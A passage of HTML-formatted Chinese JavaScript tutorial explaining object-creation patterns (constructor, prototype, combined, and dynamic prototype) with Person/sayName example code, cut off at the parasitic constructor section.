justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"Software\"</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){\n}\nPerson.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){\n &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;}\n}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();\nperson1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"function\"</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);\nperson1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 